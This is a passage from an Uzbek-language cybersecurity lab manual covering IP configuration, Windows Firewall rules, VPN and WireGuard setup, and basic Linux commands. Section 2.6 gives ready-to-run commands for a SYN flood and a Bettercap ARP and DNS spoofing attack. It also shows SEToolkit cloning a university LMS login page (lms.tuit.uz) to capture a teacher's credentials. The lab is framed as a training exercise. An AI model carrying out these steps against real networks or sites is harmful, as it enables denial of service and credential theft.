+	•	Standart shlyuz (Default gateway): Ulanmoqchi bo‘lgan tarmoq qurilmasi bilan mos bo‘lishi kerak. Masalan standart shlyuz 192.168.10.1 dan foydalanish mumkin.
+
+2.14-rasm. Statik IP manzilni o‘rnatish
+5. Sozlamalarni saqlash
+Internet Protocol Version 4 (TCP/IPv4) xususiyatlari oynasida OK tugmasi bosiladi, keyin Ethernet Properties oynasidagi ham OK tugmasi bosiladi.
+Eslatma: Ikkala holatda ham OK tugmasini bosishingiz kerak, aks holda sozlamalaringiz saqlanmaydi!
+6. Dinamik IP (DHCP) manzilga qaytarish
+Kompyuterni DHCPga qaytarish uchun 1-3-bosqichlar yana takrorlanadi. “Internet Protocol Version 4 (TCP/IPv4) Properties” oynasiga kirganingizda, “Obtain an IP address automatically” tugmasini bosing (2.15-rasm). Bu sizning shaxsiy kompyuteringizga tarmoqdagi tasodifiy IP-manzilni tayinlash imkonini beradi.
+Eslatma: Ikkala holatda ham OK tugmalarini bosish kerak, aks holda sozlamalaringiz saqlanmaydi!
+
+2.15-rasm. Dinamik IP ni o‘rnatish
+Sozlamalarni tekshirish uchun qurilma qanaqa IP olganligini bilish uchun Windows OTda “cmd” oynasini ochib, “ipconfig” buyrug‘ini kiriting (2.16-rasm).
+
+2.16-rasm. Sozlamalarni tekshirish
+Qurilmalar orasida aloqa bor yoki yo‘qligini tekshirish hamda IP manzillar to‘g‘ri berilganligini sinash uchun ping buyrug‘i ishlatiladi. Qurilmalarni bir-birining IP manzillariga ping yuboring. Agar javob kelsa aloqa bor (2.17-rasm), aks holda esa yo‘q.
+
+2.17-rasm. Aloqani tekshirish
+	Windows OTda mustaqil ravishda statik IP manzilni o‘rnatish jarayonini amalga oshiring, masalan: 192.168.50.10.
+	•	Har ikki mashina o‘rtasida ping tekshiruvi o‘tkazish jarayonlarini amaliyotda sinab ko‘ring.
+	•	IP sozlamalari va ping natijalarini faylga saqlab hamda IP, Gateway, Subnet mask haqida qisqa hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Windows OTda mustaqil ravishda statik IP manzilni o‘rnatish jarayonini amalga oshiring, masalan: 192.168.50.10.
+	•	Har ikki mashina o‘rtasida ping tekshiruvi o‘tkazish jarayonlarini amaliyotda sinab ko‘ring.
+	•	IP sozlamalari va ping natijalarini faylga saqlab hamda IP, Gateway, Subnet mask haqida qisqa hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+2.4. Tarmoqlararo ekran va filtrlash
+O‘quvchilarda Windows/Linux operatsion tizimining asos tarmoqlararo ekran vositasini sozlash ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda Windows/Linux operatsion tizimining asos tarmoqlararo ekran vositasini sozlash ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Windows operatsion tizimi;
+	•	Windows Firewall dasturiy vositasi.
+	•	Shaxsiy kompyuter;
+	•	Windows operatsion tizimi;
+	•	Windows Firewall dasturiy vositasi.
+Ishning bajarish tartibi
+Tarmoqlararo ekran (firewall) tarmoq trafigini nazorat qilish va ruxsatsiz foydalanishlarni oldini olish uchun ishlatiladigan vosita. Tarmoqlararo ekran trafikni o‘tkazishga mas’ul bo‘lgan filtrlarni quyidagi mezonlarga muvofiq sozlash imkonini beradi:
+	•	IP-manzil. Ma’lumki, IP protokolidan foydalanadigan har qanday so‘nggi qurilma noyob manzilga ega bo‘lishi kerak. Manzilni yoki ma’lum bir diapazonni ko‘rsatib, ulardan paketlarni olishni taqiqlash yoki aksincha, faqat ushbu IP-manzillardan foydalanishga ruxsat berish mumkin.
+	•	Domen nomi. Ma’lumki, Internetdagi sayt, aniqrog‘i uning IP-manzili harflar bilan bog‘lanishi mumkin va buni raqamlar to‘plamiga qaraganda esda saqlash ancha osondir. Shunday qilib, filtr trafikni faqat manbalardan biriga / biridan uzatadigan yoki unga kirishni taqiqlaydigan qilib sozlanishi mumkin.
+	•	Port. Dasturiy ta’minot portlari, ya’ni dasturlarning tarmoq xizmatlariga kirish nuqtalari. Masalan, FTP 21-portdan foydalanadi, web-brauzer dasturlari 80-portdan foydalanadi. Bu keraksiz xizmatlardan va tarmoq dasturlaridan foydalanishni rad etish yoki aksincha, faqat ulardan foydalanish huquqini berish imkonini beradi.
+	•	Protokol. Tarmoqlararo ekran faqat bitta protokolga ma’lumotlarni uzatishi yoki undan foydalanishni taqiqlashi uchun sozlanishi mumkin. Odatda protokol turi u foydalanadigan dasturning vazifalari va himoya parametrlari to‘plami sifatida ishlatiladi.
+Lokal tarmoqlarni kiruvchi trafik va ruxsatsiz foydalanishdan himoya qilish uchun turli xil tarmoqlararo ekranlar qo‘llaniladi. Amalga oshirish uslubiga qarab, ular dasturiy yoki apparat-dasturiy bo‘lishi mumkin.
+Dasturiy Firewall - bu kompyuterga o‘rnatilgan va tarmoqni tashqi tahdidlardan himoya qiladigan maxsus dastur. Bu xususiy kompyuterlar uchun, shuningdek, uy yoki kichik ofis kabi kichik lokal tarmoqlar uchun qulay va arzon yechim hisoblanadi. Ular ofisdan tashqarida ishlatiladigan korporativ kompyuterlarda ishlatilishi mumkin. Windows operatsion tizimlarida ham o‘zining dasturiy tarmoqlararo ekrani mavjud. 
+Tarmoqlararo ekran parametrlarini o‘rnatish va sozlash. Birinchi navbatda, tarmoqlararo ekranning holatini buyruqlar qatoridan ko‘rish kerak. Buning uchun Win + R tugmalari birgalikda bosiladi, so‘ngra cmd buyrug‘i kiritiladi va Enter tugmasi bosiladi. Shundan so‘ng 2.18-rasmdagi oyna ochiladi. Unga quyidagi kod kiritiladi: “C:\Users\user>netsh advfirewall set allprofiles state off” va Enter tugmasi bosiladi.
+
+2.18-rasm. CLI kodini o‘rnatish
+Agar kodning oxiridagi “off” holati “on” holatiga almashtirilsa, tarmoqlararo ekran faollashtiriladi (2.19-rasm).
+
+2.19-rasm. Tarmoqlararo ekranni faollashtirish
+Windowsda tarmoqlararo ekranni ochish uchun “Пуск” tugmasi bosiladi, qidiruv satriga “firewall” so‘zi kiritiladi hamda Enter tugmasi bosiladi yoki 2.20 va 2.21-rasmlarda ko‘rsatilgan buyruqlar satri orqali ham kirish mumkin. Shundan so‘ng, 2.22-rasmdagi oyna ochiladi.
+
+2.20-rasm. Buyruqlar satri orqali firewallga kirish
+
+2.21-rasm. Buyruqlar satri orqali firewallga kirish
+
+2.22-rasm. Windows Defender tarmoqlararo ekranning asosiy oynasi
+Bu yerda siz asosiy sozlamalarni sozlashingiz mumkin va qo‘shimcha funksiyalarni sozlash uchun “Дополнительные функции” bo‘limiga o‘tishingiz kerak (2.22-rasm).
+
+2.23-rasm. Firewallni faollashtirish oynasi
+Firewallni faollashtirishni yana bir usuli 2.23-rasmda ko‘rsatilgan bo‘lib, bunda firewallni turli holatlar uchun yoqish, o‘chirish mumkin.
+
+2.24-rasm. Tarmoqlararo ekranning asosiy va qo‘shimcha sozlamalari
+Sozlamalarga muvofiq ruxsat berilgan va ta’qiqlangan harakatlarni bajarish. Tarmoqlararo ekran kiruvchi yoki chiquvchi trafikni filtrlash orqali kompyuter xavfsizligini oshirishga xizmat qiladi. Buning yordamida internetdan foydalanishni ma’lum dasturlardan tashqari har kimga cheklash yoki u o‘rnatilgan kompyuterga faqat tashqi tarmoqdan yoki faqat ichki tarmoqdan, faqat ma’lum bir portda, aniq IP-manzillardan ulanishingizga ruxsat berishingiz va boshqa harakatlarni amalga oshirishingiz mumkin. 
+Tarmoqlararo ekran bu qoidalar to‘plamidir. Qoida - bu ulanishga ruxsat berish yoki rad etish tavsifidir. Ular kiruvchi va chiquvchi bo‘lishi mumkin, mos ravishda ushbu kompyuterga yoki ushbu kompyuterdan tarmoqqa ulanishni tartibga soladi.
+Masalan, saytga tashqi tarmoqdan kirishni xohlasangiz, tarmoqlararo ekran qoidasini sozlashingiz kerak. Buning uchun Win + R tugmachalarini bosing va buyruq satriga firewall.cpl buyrug‘ini kiriting. Keyin chap ustunda “Дополнительные параметры” ni tanlaymiz (2.25-rasm).
+
+2.25-rasm. Tarmoqlararo ekranning qo‘shimcha parametrlari
+Ochilgan xavfsizlik oynasida “Правила для входящих подключений” bo‘limiga o‘ting va keyin “Создать правило” tugmachasini bosing (2.26-rasm).
+
+2.26-rasm. Kiruvchi ulanishlar uchun qoida yaratish
+Misol uchun, 80-port uchun qoida yarataylik (2.27-rasm). Buning uchun siz ma’lum bir dastur uchun qoida yaratishingiz yoki standart Windows xizmatlari uchun undan foydalanishingiz mumkin. Bundan tashqari, to‘liq moslashtirilgan qoidalar yaratishingiz mumkin.
+
+2.27-rasm. Port uchun qoida yaratish
+Trafikni filtrlash uchun protokol turini tanlaymiz, u TCP yoki UDP bo‘lishi mumkin, port har qanday bo‘lishi mumkin yoki barcha portlarni ochib yopishingiz mumkin (2.28-rasm).
+
+2.28-rasm. Protokol turini tanlash
+Keyinchalik, biz qoidani aniq nima qilish kerakligini, ya’ni biz ko‘rsatgan portlarda trafikka ruxsat berish yoki rad etish kerakligini aniqlaymiz (2.29-rasm).
+
+2.29-rasm. Ulanish shartlarga javob berganda bajariladigan harakatni tanlash
+Ushbu qoida qaysi tarmoq uchun qo‘llanilishi kerakligini ko‘rsatamiz. Domen, xususiy yoki jamoat tarmog‘idan birini (yoki bir nechtasini) tanlaymiz (2.30-rasm).
+
+2.30-rasm. Qoidani qo‘llash uchun profilni tanlash
+Oxirgi bosqichda qoida nomi ko‘rsatiladi va shundan keyin ushbu portga ulanish mumkin bo‘ladi. Belgilangan chegarani tekshirish uchun siz Google Chrome brauzeriga o‘tishingiz kerak. Shundan so‘ng biror havolaga kiring. Brauzer siz kiritgan manzilni ochmaydi va quyidagi oyna paydo bo‘ladi. “Ваш доступ в Интернет заблокирован” ma’lumoti Internetdan foydalanish huquqi bloklanganligini anglatadi (2.31-rasm).
+
+2.31-rasm. Internetga ulanish bloklanishi
+Agar siz yuqorida o‘rnatilgan bloklash parametrini bekor qilsangiz va brauzerni yangilasangiz, brauzer ko‘rsatilgan manzilga o‘tishini ko‘rishingiz mumkin (2.32-rasm).
+
+2.32-rasm. Belgilangan manzilga brauzer orqali kirish
+
+	Windows OTda mustaqil tarmoqlararo ekran vositasini vaqtinchalik o‘chirish va faollashtirish jarayonlarini amalga oshiring.
+	•	Tarmoqlararo ekran vositasi orqali portlarga ruxsat berish yoki bloklashni amalga oshiring.
+	•	Tarmoqlararo ekran vositasida yaratgan va qo‘llagan qoidalari haqida qisqa hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Windows OTda mustaqil tarmoqlararo ekran vositasini vaqtinchalik o‘chirish va faollashtirish jarayonlarini amalga oshiring.
+	•	Tarmoqlararo ekran vositasi orqali portlarga ruxsat berish yoki bloklashni amalga oshiring.
+	•	Tarmoqlararo ekran vositasida yaratgan va qo‘llagan qoidalari haqida qisqa hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+2.5. VPN sozlash: Windows va WireGuard
+O‘quvchilarda VPN aloqa o‘rnatish bo‘yicha ko‘nikmani shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda VPN aloqa o‘rnatish bo‘yicha ko‘nikmani shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Windows operatsion tizimi;
+	•	WireGuard VPN dasturi.
+	•	Shaxsiy kompyuter;
+	•	Windows operatsion tizimi;
+	•	WireGuard VPN dasturi.
+Ishning bajarish tartibi
+VPN (Virtual Private Network) xavfsiz, shifrlangan aloqa orqali masofaviy tarmoqlarga ulanish uchun ishlatiladi.
+VPN quyidagilarni ta’minlaydi:
+	•	Ma’lumotlar shifrlangani bois o‘rtadagi provayder, Wi-Fi egasi yoki boshqa tarmoq kuzatuvchilari nima yuborilayotganini ko‘ra olmaydi.
+	•	Haqiqiy IP manzil yashiriladi va bu geografik cheklovlarni chetlab o‘tish va anonimlik ta’minlashga xizmat qiladi.
+	•	Masofadan turib xodimlar korporativ tarmoqqa xavfsiz ulanishi mumkin.
+	•	Ochiq Wi-Fi tarmoqlarda xavfsizlikni oshiradi.
+VPN ikkita asosiy qismdan iborat:
+	•	Tunnel: internet orqali ikki nuqta o‘rtasida virtual “kanal” yaratiladi.
+	•	Shifrlash: barcha ma’lumotlar AES-256, ChaCha20 kabi kuchli algoritmlar bilan shifrlanadi.
+Eng keng tarqalgan VPN protokollari:
+	•	OpenVPN (eng moslashuvchan va xavfsiz);
+	•	WireGuard (eng tezkor va sodda);
+	•	IKEv2/IPSec (Windows va mobil qurilmalarda yaxshi ishlaydi);
+	•	L2TP/IPSec, PPTP.
+Windowsda ichki VPN sozlash:
+1. Windows VPN menyusini ochish. Buning uchun Windows OTning “Settings (Параметры)” bandiga kirib, “Network & Internet (Сеть и Интернет)” bo‘limiga o‘tiladi. Chap menyudagi VPN bo‘limi tanlanadi (2.33-rasm).
+2. Yangi VPN ulanish yaratish. Ochilgan oynadan “Add a VPN connection (Добавить VPN-подключение)” tugmasi bosiladi (2.34-rasm).
+3. VPN ma’lumotlarini to‘ldirish. Hosil bo‘lgan oynaga quyidagi ma’lumotlarni kiritamiz (testlash uchun):
+
+2.33-rasm. Windows VPN sozlamalari
+
+2.34-rasm. Yangi VPN ulanish yaratish
+	•	“Поставщик услуг VPN” - Bu joyda VPN xizmatining turi tanlanadi. Windows OT faqat o‘zining ichki VPN mijozini taklif qiladi (“Windows (встроенный)” - tanlanadi).
+	•	“Имя подключения” - Bu yerda VPN ulanishingizga o‘zingiz beradigan nom kiritiladi (Masalan: TestVPN).
+	•	“Имя или адрес сервера” - Bu joyga VPN serverning IP manzili yoki domen nomi yoziladi (Masalan: 10.0.0.1 yoki vpn.test.local).
+	•	“Тип данных для входа” - VPNga ulanishda qaysi autentifikatsiya usuli ishlatilishi (Odatda “Имя пользователя и пароль”). tanlanadi
+	•	“Имя пользователя (необязательно)” - VPNga ulanish uchun login yoziladigan joy (Masalan: student).
+	•	“Пароль (необязательно)” - VPNga ulanish uchun parol (Masalan: 12345).
+	•	“Запомнить мои данные для входа” - Bu belgi qo‘yilsa, tizim login va parolni eslab qoladi.
+
+2.35-rasm. Yangi VPN aloqani o‘rnatish
+Endi kerakli maydonlar to‘ldirilib “Сохранить” tugmasi bosiladi va VPN aloqa qo‘shiladi (2.35-rasm). So‘ngra “Подключиться” tugmasini bosish orqali VPN ulanishni amalga oshiramiz.
+WireGuard dasturini o‘rnatish. Buning uchun brauzerni oching va https://www.wireguard.com/install/ manzilini kiriting. Windows uchun o‘rnatuvchini yuklab olib ishga tushiring (“Install → Finish”).
+
+2.36-rasm. WireGuard dasturini ishchi oynasi
+Yangi tunel yaratish. Buning uchun WireGuardni ochib “Add Tunnel (Добавить туннель)” tugmasini yonidagi strelkani bosib, “Add empty tunnel (Добавить пустой туннель)” tugmasini bosing. WireGuard avtomatik ravishda “Private key (Приватный ключ)” va “Public key (Публичный ключ)” larni yaratib beradi. Bular ikkita maxsus kalit VPN (ayniqsa WireGuard) xavfsiz ishlashi uchun shifrlash jarayonida ishlatiladi.
+Test VPN konfiguratsiyasi yozish. Quyidagi konfiguratsiyani kiriting (2.37-rasm):
+[Interface]
+Address = 10.20.30.2/32
+PrivateKey = (WireGuard yaratgan private key)
+DNS = 8.8.8.8
+
+[Peer]
+PublicKey = (WireGuard yaratgan public key)
+AllowedIPs = 0.0.0.0/0
+Endpoint = 127.0.0.1:51820
+
+2.37-rasm. Yaratilayotgan VPN tunnel konfiguratsiyasi
+Har bir bandning ma’nosi quyidagicha:
+Address – VPN ichidagi IP manzilingiz (faqat test uchun).
+PrivateKey – sizning shaxsiy kalitingiz.
+DNS – foydalaniladigan DNS server.
+PublicKey – serverga ulanish uchun ishlatiladigan ochiq kalit (bu testda o‘zi bilan ulanadi).
+AllowedIPs – qaysi trafik VPN orqali o‘tishi.
+Endpoint – test rejimi uchun VPN server manzili lokalhost (127.0.0.1).
+Tunelni ishga tushirish. WireGuard oynasida “Activate” tugmasini bosing (2.38-rasm). Agar sozlamalar to‘g‘ri bo‘lsa — tunel yashil bo‘ladi. Windows OT tarmoq interfeyslarida yangi “WireGuard Tunnel” qo‘shiladi.
+
+2.38-rasm. Tunnelning ishga tushganligi
+
+2.39-rasm. Tunel ishlashini tekshirish
+Tunel ishlashini tekshirish. Windows CMD oynasini oching ipconfig deb yozing. Natijada “WireGuard Tunnel” ko‘rinadi (2.39-rasm). VPN IP manziliga ping yuboring, agar javob qaytsa, demak test tuneli to‘g‘ri ishlayapti.
+VPN tunelni o‘chirish. WireGuard oynasida “Deactivate” (Отключить) tugmasini bosing. Interfeys o‘chadi va tarmoq normal holatga qaytadi.
+
+2.40-rasm. VPN tunnelni o‘chirish
+	Windows OTda “Add VPN connection” orqali TestVPN yaratish jarayonlarini amalga oshiring.
+	•	VPN turini o‘zgartirib: PPTP, L2TP va IKEv2 turlarini sinab ko‘ring.
+	•	WireGuard ilovasini o‘rnating va yangi “empty tunel” yarating, uni “Activate” qiling.
+Amaliy topshiriqlar
+
+
+	•	Windows OTda “Add VPN connection” orqali TestVPN yaratish jarayonlarini amalga oshiring.
+	•	VPN turini o‘zgartirib: PPTP, L2TP va IKEv2 turlarini sinab ko‘ring.
+	•	WireGuard ilovasini o‘rnating va yangi “empty tunel” yarating, uni “Activate” qiling.
+Amaliy topshiriqlar
+
+
+2.6. Tarmoqlarda VPN qurish va shifrlash
+O‘quvchilarda tarmoq hujumi va undan himoyalanish bo‘yicha bilim va ko‘nikmalarni shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda tarmoq hujumi va undan himoyalanish bo‘yicha bilim va ko‘nikmalarni shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Kali Linux (VirtualBox da ishlatish tavsiya etiladi);
+	•	Bettercap va SEToolkit vositalari.
+
+	•	Shaxsiy kompyuter;
+	•	Kali Linux (VirtualBox da ishlatish tavsiya etiladi);
+	•	Bettercap va SEToolkit vositalari.
+
+Ishning bajarish tartibi
+Tarmoq hujumi — bu kiberjinoyatchining kompyuter tarmog‘idan ruxsatsiz foydalanib, ma’lumotlarni olish, buzish, o‘zgartirish yoki tizimni ishdan chiqarish uchun qiladigan harakatlaridir.
+Boshqacha aytganda tarmoq hujumi – ruxsatsiz foydalanish orqali ma’lumot o‘g‘irlash yoki tizimni buzish. Eng mashhur tarmoq hujumlariga DoS/DDoS, ARP Spoofing/MITM, Sniffing, Portni skanerlash (Port scanning), Qo‘pol kuch (Brute-force)larni misol keltirish mumkin. Bu ishda ARP Spoofing + DNS Spoof + Phishing hujumlarini simulyatsiya qilamiz (MITM hujumi).
+Tarmoq hujumlari odatda quyidagilarni nishonga oladi:
+	•	Tarmoqdagi qurilmalar (kompyuter, router, server);
+	•	Tarmoqdagi uzatilayotgan paketlar;
+	•	Autentifikatsiya ma’lumotlari (login/parol);
+	•	Tizimning ishlash barqarorligi.
+Tarmoq hujumlarining eng ko‘p uchraydigan turlari:
+	•	DoS/DDoS hujumi — tarmoqni keraksiz trafik bilan to‘ldirib ishdan chiqarish.
+	•	ARP Spoofing / MITM — qurilmalar orasiga o‘zini joylashtirib tarmoqdagi ma’lumotlarni o‘g‘irlash.
+	•	Sniffing — tarmoqdan o‘tayotgan paketlarni kuzatib ma’lumot yig‘ish.
+	•	Port scanning — qurilmaning ochiq portlarini aniqlash.
+	•	Brute-force — parollarni taxmin qilish orqali tizimga kirishga urinish.
+Windows OTda tarmoq hujumlaridan himoyalanish. Windows OTning o‘zida mavjud himoya mexanizmlari:
+1. Windows Defender Firewall:
+	•	Keraksiz portlarni bloklaydi.
+	•	Hujum manbalarini avtomatik filtrlaydi.
+2. Windows Security:
+	•	Tarmoq himoyasini amalga oshiradi (Network Protection)
+	•	Real vaqtda monitoringlashni amalga oshiradi.
+3. Network Level Authentication:
+	•	RDP va boshqa xizmatlar uchun kuchli himoyani ta’minlaydi.
+4. Ma’lumotlarni shifrlash:
+	•	HTTPS protokolini amalga oshirish orqali.
+	•	VPN ulanish orqali.
+
+2.41-rasm. VirtualBoxda 3 ta virtual mashinani yaratish va tarmoqni sozlash
+Ishni bajarish ketma-ketligi quyida batafsil tushuntirilgan:
+1. Virtual muhitni tayyorlash
+VirtualBox yoki VMware yordamida quyidagi tizimlar o‘rnatiladi (2.41-rasm): 
+	•	Kali Linux (hujumchi) – IP manzili 192.168.0.101 (172.16.7.120);
+	•	Windows 10 (qurbon) – IP manzili 192.168.0.103;
+	•	Ubuntu Server (maqsadli server) – IP manzili 172.16.5.97.
+Tarmoq NAT Network yoki Bridged Adapter rejimida sozlanadi (2.41-rasm).
+2. Wireshark vositasi 
+Wireshark tarmoq trafigini yozib oladi va hujum paketlarini tahlil qiladi.
+
+2.42-rasm. Wiresharkni ishga tushirish va interfeysni tanlash
+3. DoS hujum senariysi. Kali Linuxda hping3 yordamida SYN Flood hujumi quyidagicha amalga oshiriladi.
+sudo hping3 -S --flood -V -p 80 192.168.56.102
+
+2.43-rasm. hping3 buyrug‘ini ishga tushganligi
+Wiresharkda ko‘p miqdorda SYN paketlari ko‘rish mumkin. Biroq ularga mos ACK javobi mavjud emas.
+
+2.44-rasm. Wiresharkda SYN Flood trafik ko‘rinishi (faqat SYN flag, hech qanday javob yo‘q)
+Demak faqat Ubuntu serverga (172.16.5.97) yuborilayotgan SYN paketlar ko‘rinmoqda, server esa javob qaytargani yo‘q. Demak, hujum amalga oshirildi.
+3. MITM hujumi. Maqsad DNS spoofing hujumi orqali o‘qituvchi login parolini olish.
+1. ARP Spoofing va DNS Spoof uchun Bettercap ilovasi ishga tushiriladi.
+ARP Spoofing – qurilmalar orasiga o‘zini joylashtirib, trafikni o‘g‘irlash. DNS Spoof – DNS so‘rovlarini soxtalashtirib, saytlarni boshqa IP ga yo‘naltirish.
+Kali Linux terminalini oching va Bettercap ilovasini quyidagi buyruqlar orqali ishga tushiring:
+sudo apt update
+sudo apt install bettercap
+sudo apt install bettercap -ui
+sudo bettercap
+Bettercap – ARP va DNS spoof uchun kuchli vosita, terminalda ishlaydi.
+2. Tarmoqni skanerlang (qurbon IP ni topish uchun) (2.46-rasm):
+probe on
+net.show
+Tarmoqda qaysi qurilmalar borligini ko‘rish mumkin: qurbon IP (masalan, 192.168.0.103) va gateway IP (router, masalan, 192.168.0.1) manzillari topiladi.
+
+2.45-rasm. Bettercap ilovasini o‘rnatish
+
+2.46-rasm. Bettercapni ishga tushurish va tarmoqni skanerlash
+3. ARP Spoof ilovasini yoqing (2.47-rasm):
+arp.spoof on
+set arp.spoof.targets 192.168.0.103
+Bu xakerni qurbon va router orasiga joylashtiradi, ya’ni qurbon trafigi xaker orqali o‘tadi.
+
+2.47-rasm. ARP Spoof ilovasini yoqish va DNS Spoof hujumiga sozlash
+4. DNS Spoof hujumiga sozlang va yoqing (2.47-rasm):
+set dns.spoof.domains lms.tuit.uz,*.lms.tuit.uz
+set dns.spoof.address 192.168.0.101
+dns.spoof on
+DNS spoof – qurbon lms.tuit.uz so‘raganda, xaker IP manziliga (192.168.0.101) yo‘naltiradi. Bundan maqsad soxta saytga yo‘naltirish hisoblanadi.
+ARP spoof trafigini o‘g‘irlash, DNS spoof saytni soxtalashtirish bu hujum asosini yaratadi.
+5.  Saytni klonlash va lokal serverga joylash (SEToolkit bilan).
+SEToolkit – ijtimoiy injineriya vositasi bo‘lib, saytni klonlash uchun ishlatiladi.
+Terminalda SEToolkit ilovasini ishga tushiring:
+sudo setoolkit
+SEToolkit – hujum vositasi, saytni klonlash va fishing uchun mo‘ljallangan.
+Menuda variantlarni tanlang: 2 ni bosing (Website Attack Vectors) keyin 3 ni bosing (Credential Harvester Attack Method) keyin 2 ni bosing (Site Cloner).
+
+2.48-rasm. Site Clonerni tanlash
+IP manzil: 192.168.0.101 va URL manzilni kiriting: https://lms.tuit.uz (klonlash uchun) kiriting (2.49-rasm).
+Site Cloner – saytni to‘liq nusxalaydi va lokal serverga joylashtiradi va natijada qurbon soxta saytga kiradi.
+
+2.49-rasm. Saytni klonlash
+6. Lokal server ishlayotganini tekshiring.
+SEToolkit avtomatik Apache serverni ishga tushiradi va natijada brauzerda http://192.168.0.101 manzilida klonlangan saytni ko‘rish mumkin.
+Soxta sayt lokal IP manzilda ishlaydi va DNS spoof orqali qurbon shu yerga yo‘naltiriladi.
+
+2.50-rasm. Klonlangan sayt
+Klonlangan sayt – o‘qituvchi login/parolni yozganda, ma’lumotlar xakerga uzatiladi.
+7. Hujumni ishga tushirish va natijani kuzatish. Bettercap ilovasini ishga tushiring va spoof buyrug‘ini kiriting (yuqoridagi 1-qadam).
+Hujum real vaqt ishlaydi va qurbon sayt so‘ralganda soxta saytga yo‘naltiriladi.
+Qurbon (o‘qituvchi) simulyatsiyasi: Boshqa kompyuterda brauzerni oching, http://192.168.0.101 manzilini kiriting va natijada soxta sayt ochiladi. Unda Login/parolni kiriting (2.51-rasm). Natijada qurbon ma’lumotlari xakerga keladi.
+SEToolkit da natijani ko‘rish. Terminalda qurbon login/parol namoyon bo‘ladi (2.52-rasm). Bu hujum muvaffaqiyatli o‘tganini isbotlaydi.
+Ma’lumot o‘rnida shuni aytish mumkinki ushbu hujum senariysi faqat http protokolida ishlaydigan saytlar uchun ishlaydi.
+
+2.51-rasm. Soxta saytga login va parol kiritish
+
+2.52-rasm. Terminalda kiritilgan login va parolni ko‘rish
+		Laboratoriya muhitida Bettercap ilovasi bilan ARP va DNS spoof hujumlarini amalga oshiring.
+	•	SEToolkit ilovasi bilan saytni klonlang (ixtiyoriy http saytni).
+	•	Hujumni sinab ko‘ring va natijani hisobotda aks ettiring.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida Bettercap ilovasi bilan ARP va DNS spoof hujumlarini amalga oshiring.
+	•	SEToolkit ilovasi bilan saytni klonlang (ixtiyoriy http saytni).
+	•	Hujumni sinab ko‘ring va natijani hisobotda aks ettiring.
+Amaliy topshiriqlar
+
+
+
+
+
+
+
+
+
+3-bob haqida umumiy ma’lumot
+Mazkur bobda operatsion tizim tushunchasi, Windows/Linux OT xavfsizlik mexanizmlari, fayl tizimlari, foydalanuvchi turlari, guruhlar, operatsion tizimning hodisalarni qaydlash jurnallari, ular asosida tahdidlarni aniqlash, Windows OT da foydalanuvchilarni yaratish, o‘chirish, ular uchun parollar siyosatini o‘rnatish, shuningdek, operatsion tizim imkoniyatlaridan foydalangan holda fayllarni shifrlash va deshifrlash, tizimni xavfsiz yuklash (Secure Boot), BIOS xavfsizligi hamda tizim yangilanishlarining axborot xavfsizligini ta’minlashdagi o‘rni kabi masalalar nazariy va amaliy jihatidan tushuntiriladi.
+3.1. Windows va Linux xavfsizligi
+O‘quvchilarda Linux OT bilan ishlash ko‘nikmalarini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda Linux OT bilan ishlash ko‘nikmalarini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Ubuntu operatsion tizimi;
+	•	Terminal oynasi.
+
+	•	Shaxsiy kompyuter;
+	•	Ubuntu operatsion tizimi;
+	•	Terminal oynasi.
+
+Ishning bajarish tartibi
+Linux operatsion tizimi (OT) ochiq kodli va serverlar, superkompyuterlar va mobil qurilmalarda keng qo‘llaniladi. Fundamental buyruqlar terminal orqali fayllar, papkalar va tizimni boshqarishga yordam beradi. Ushbu laboratoriya ishida virtual muhitda Linux OTning Ubuntu versiyasida asosiy buyruqlarni amalga oshirish ko‘rib chiqiladi. Bu ko‘nikmalar Linux OT bilan ishlashning asosini tashkil etadi va real hayotda serverni boshqarish, dasturlash va avtomatlashtirishda muhim hisoblanadi. Har bir qadam o‘quvchi mustaqil bajarishi uchun batafsil tushuntiriladi.
+Quyidagi jadvallarda buyruq va ularning vazifalari keltirib o‘tilgan:
+3.1-jadval
+Fayl va kataloglar bilan ishlash buyruqlari
+Buyruq
+Vazifasi
+pwd
+Joriy katalog manzilini ko‘rsatadi;
+ls
+Katalog ichidagi fayl va papkalarni ko‘rsatadi;
+cd
+Kataloglar o‘rtasida o‘tish;
+mkdir
+Yangi papka yaratish;
+rmdir
+Bo‘sh papkani o‘chirish;
+rm
+Fayl yoki papkani o‘chirish;
+cp
+Fayl va papkalarni nusxalash;
+mv
+Fayl/papkani ko‘chirish yoki nomini o‘zgartirish;
+3.2-jadval
+Fayl mazmuni bilan ishlash buyruqlari
+Buyruq
+Vazifasi
+cat
+Fayl mazmunini ko‘rsatadi;
+head
+Faylning boshidan bir necha qator ko‘rsatadi;
+tail
+Oxiridan bir necha qator ko‘rsatadi;
+nano, vi
+Faylni tahrirlash.
+3.3-jadval
+Jarayonlar (process) bilan ishlash
+Buyruq
+Vazifasi
+ps
+Jarayonlar ro‘yxati;
+top
+Real vaqtda resurslardan foydalanishni ko‘rsatadi;
+kill
+Jarayonni to‘xtatadi;
+htop
+Top ilovasining qulay versiyasi (oldin o‘rnatilishi kerak).
+
+3.4-jadval
+Tizim bo‘yicha axborot
+Buyruq
+Vazifasi
+whoami
+Tizimdagi foydalanuvchi nomi;
+uname -a
+Tizimning umumiy ma’lumotlari;
+df -h
+Disk hajmi bo‘yicha ma’lumot;
+free -h
+RAM holati;
+ifconfig yoki ip a
+Tarmoq interfeyslari.
+Amaliy qismni bajarish ketma-ketliklari. Terminalni ochish uchun Ctrl+Alt+T tugmalarini bosing yoki “Applications” menyusidan “Terminal” ni qidiring.
+Direktoriyalar bilan ishlash buyruqlari. Terminalda quyidagi buyruqlarni sinab ko‘ring:
